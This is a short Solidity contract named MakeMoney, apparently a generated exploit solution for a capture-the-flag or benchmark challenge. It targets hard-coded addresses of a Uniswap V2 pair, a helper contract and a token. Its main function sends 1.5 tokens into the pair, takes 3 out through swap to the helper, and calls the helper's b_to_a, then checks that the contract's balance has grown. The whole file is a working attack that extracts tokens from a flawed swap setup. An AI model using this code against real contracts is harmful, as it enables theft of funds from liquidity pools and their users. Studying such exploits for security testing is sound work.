// SPDX-License-Identifier: MIT

pragma solidity 0.8.18;


interface IUniswapV2Pair {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

interface IERC20 {
    function transfer(address to, uint256 value) external returns (bool);
    function balanceOf(address owner) external view returns (uint256);
}

interface IAB11 {
    function a_to_b() external;
    function b_to_a() external;
}

contract MakeMoney {

    address public address_uniswapv2pair_b_a = 0x12EDeef345df4D793a4e7185eCE9807f5F7cE3d9;
    address public address_ab11 = 0x50010c607a1BDA23CFCf45a0D65CAC5BD14Fb7EE;
    address public address_a = 0x64087006D06B09A961E33928c99A9DDE69D1A313;

    uint256 public cost_a = 1500000000000000000; // 1.5 ether
    uint256 public revenue_a = 3000000000000000000; // 3 ether

    function main() external {
        uint256 balance_a = IERC20(address_a).balanceOf(address(this));
        require(balance_a > cost_a, "hwbokwtypvjgtmsa: balance_a > 1.5 ether.");
        
        IERC20(address_a).transfer(address_uniswapv2pair_b_a, cost_a);
        IUniswapV2Pair(address_uniswapv2pair_b_a).swap(revenue_a, 0, address_ab11, "");
        IAB11(address_ab11).b_to_a();

        require(IERC20(address_a).balanceOf(address(this)) > balance_a, "vefvjolxjlmbsehj: Earn some money.");
    }
}